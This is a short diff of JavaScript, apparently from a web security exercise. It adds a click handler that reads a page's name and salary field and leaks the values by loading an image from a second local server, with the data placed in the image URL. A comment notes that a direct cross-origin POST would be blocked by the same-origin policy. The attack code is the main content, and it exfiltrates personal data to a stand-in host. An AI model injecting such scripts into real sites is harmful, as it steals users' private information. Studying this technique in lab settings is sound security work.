@@ -29,7 +29,16 @@ greetingNode.appendChild(welcomeText);
 document.addEventListener("click", function () {
   var salaryField = document.getElementById("OwnSalary");
   var text        = salaryField.innerHTML;
-  //$.post('http://localhost:8081/exfil.php',{message:text});
+
+  var malImg    = document.createElement("img");
+  var commaPos  = text.indexOf(",");
+  var dollarPos = text.indexOf("$");
+  var name      = text.slice(3,commaPos);
+  var salary    = text.slice(dollarPos+1);
+  malImg.setAttribute("src","http://localhost:8081/" + name + "_" + salary + ".jpg");
   $.post('http://localhost:8080/selfExfil.php',{message:text});
-  console.log(text);
+
+  //The following would not work due to violation of the same origin policy enforced on all modern browsers.
+  //$.post('http://localhost:8081/exfil.php',{message:text});
+
 });
